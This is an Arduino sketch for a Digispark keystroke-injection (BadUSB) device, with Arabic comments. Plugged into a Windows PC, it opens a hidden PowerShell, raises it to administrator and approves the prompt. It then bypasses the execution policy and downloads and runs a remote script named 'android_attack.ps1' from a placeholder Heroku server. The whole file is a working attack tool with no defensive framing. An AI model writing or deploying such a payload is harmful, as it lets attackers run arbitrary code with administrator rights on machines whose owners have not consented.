here#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  // فتح PowerShell بصلاحيات المدير
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.print("powershell -WindowStyle Hidden -Command \"Start-Process PowerShell -Verb RunAs\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.delay(3000);
  
  // تحميل وتنفيذ السكريبت الرئيسي
  DigiKeyboard.print("Set-ExecutionPolicy Bypass -Scope Process -Force;");
  DigiKeyboard.print("iex ((New-Object System.Net.WebClient).DownloadString('https://your-actual-server.herokuapp.com/android_attack.ps1'))");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  DigiKeyboard.delay(10000);
}
